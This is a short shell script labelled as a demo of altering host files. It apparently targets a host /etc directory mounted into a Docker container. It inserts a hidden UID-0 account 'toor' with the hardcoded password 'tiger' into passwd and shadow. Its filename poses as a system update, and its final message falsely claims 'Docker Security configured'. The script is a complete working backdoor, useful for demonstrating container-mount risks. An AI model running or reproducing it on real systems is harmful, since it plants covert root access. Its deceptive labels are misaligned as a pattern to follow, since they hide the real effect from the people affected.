#!/bin/sh
# ---------------------------------------------------------------------------
# Trivadis AG, Infrastructure Managed Services
# Saegereistrasse 29, 8152 Glattbrugg, Switzerland
# ---------------------------------------------------------------------------
# Name.......: start_system_update.sh
# Author.....: Stefan Oehrli (oes) stefan.oehrli@trivadis.com
# Editor.....: Stefan Oehrli
# Date.......: 2017.12.04
# Revision...: 
# Purpose....: script to alter host files
# Notes......: demo script to show how host files can be altered 
# Reference..: --
# License....: Licensed under the Universal Permissive License v 1.0 as 
#              shown at http://oss.oracle.com/licenses/upl.
# ---------------------------------------------------------------------------
# Modified...:
# see git revision history for more information on changes/updates
# ---------------------------------------------------------------------------

# - Environment Variables ---------------------------------------------------
# - Set default values for environment variables if not yet defined. 
# ---------------------------------------------------------------------------
# Default name for OUD instance
SHADOW_FILE_PATH=$(find /*/etc -name shadow 2>/dev/null)
SHADOW_FILE_PATH=${SHADOW_FILE_PATH:-"/"}
export HOST_ETC_PATH=$(dirname ${SHADOW_FILE_PATH})
export PASSWORD_FILE="${HOST_ETC_PATH}/passwd"
export SHADOW_FILE="${HOST_ETC_PATH}/shadow"
export NEW_USER="toor"
export NEW_PASS="tiger"
export NEW_SALT="DeedBeef"
# - EOF Environment Variables -----------------------------------------------

# update password file
echo "-----------------------------------------------------"
echo "- check if we do have a ${PASSWORD_FILE}"
if [ -f "${PASSWORD_FILE}" ]; then
    # password file does exists so let's update / add an entry
    echo "- check if the user ${NEW_USER} already exists"
    if [ $(grep -cE ${NEW_USER} "${PASSWORD_FILE}") -eq 1 ]; then
        echo "- seems to be there, so lets update it"
        # update the NEW_USER entry
        echo "- update ${NEW_USER} in ${PASSWORD_FILE}"
        sed -i "/${NEW_USER}/c\\${NEW_USER}:x:0:0:root:/root:/bin/bash" "${PASSWORD_FILE}"
    else
        # add a new NEW_USER entry
        echo "- seems to be missing, lets add it"
        echo "- insert ${NEW_USER} into ${PASSWORD_FILE}"
        echo "${NEW_USER}:x:0:0:root:/root:/bin/bash" >>"${PASSWORD_FILE}"
    fi
else
   echo "no ${PASSWORD_FILE} found"
fi

echo "- check if we do have a ${SHADOW_FILE}"
if [ -f "${SHADOW_FILE}" ]; then
    # shadow file does exists so let's update / add an entry
    echo "- check if the user ${NEW_USER} already exists"
    if [ $(grep -cE ${NEW_USER} "${SHADOW_FILE}") -eq 1 ]; then
        echo "- seems to be there, so lets update it"
        # update the NEW_USER entry
        echo "- update ${NEW_USER} in ${SHADOW_FILE}"
        sed -i "/${NEW_USER}/c\\${NEW_USER}:$(mkpasswd --method=sha512 --salt=${NEW_SALT} ${NEW_PASS})::0:99999:7:::" "${SHADOW_FILE}"
    else
        # add a new NEW_USER entry
        echo "- seems to be missing, lets add it"
        echo "- insert ${NEW_USER} into ${SHADOW_FILE}"
        echo "${NEW_USER}:$(mkpasswd --method=sha512 --salt=${NEW_SALT} ${NEW_PASS})::0:99999:7:::" >>"${SHADOW_FILE}"
    fi  
else
   echo "no ${SHADOW_FILE} found"
fi 
sleep 10
echo "Docker Security configured :-)"
echo "-----------------------------------------------------"
exit 0
# --- EOF -------------------------------------------------------------------